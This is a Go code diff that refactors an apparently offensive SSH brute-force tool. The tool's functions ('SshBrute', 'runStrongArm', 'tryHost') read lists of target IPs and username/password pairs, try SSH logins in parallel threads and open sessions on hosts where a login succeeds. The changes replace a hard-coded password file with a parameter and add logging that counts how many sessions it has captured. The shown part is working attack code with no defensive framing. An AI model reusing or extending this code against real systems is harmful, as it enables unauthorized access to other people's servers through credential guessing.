@@ -25,20 +25,6 @@ var (
 	timeouts   string
 )
 
-/*
-func init() {
-	if len(os.Args) <= 4 {
-		fmt.Println("[INFO] Syntax: ./brute [ Port ] [ Threads ] [ IP File ] [ Timeout ]")
-		os.Exit(1)
-	} else {
-		ipfile = os.Args[3]
-		timeouts = os.Args[4]
-		threads = os.Args[2]
-		port = os.Args[1]
-	}
-}
-*/
-
 func SshBrute(userpasslist, iplist, threadcnt, timeout string) {
 	usrpswlist = userpasslist
 	threads = threadcnt
@@ -60,10 +46,8 @@ func runStrongArm() { //main() {
 		log.Fatalf("readLines: %s", err)
 	}
 
-	for _, line := range lines {
-		ips = append(ips, line)
-	}
-	lines2, err := readLines("pass")
+	ips = append(ips, lines...)
+	lines2, err := readLines(usrpswlist)
 	if err != nil {
 		log.Fatalf("readLines: %s", err)
 	}
@@ -110,6 +94,8 @@ func readLines(path string) ([]string, error) {
 	return lines, scanner.Err()
 }
 
+var sessions int
+
 func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGroup) {
 	i, _ := strconv.Atoi(timeouts)
 	config := &ssh.ClientConfig{
@@ -129,7 +115,11 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 	} else {
 		session, err := client.NewSession()
 		if err != nil {
+			log.Printf("Unable to gain a session on %s\nError: %s", addr, err.Error())
 			return
+		} else {
+			sessions++
+			log.Printf("Retrieved Sessions: %d", sessions)
 		}
 
 		var b bytes.Buffer
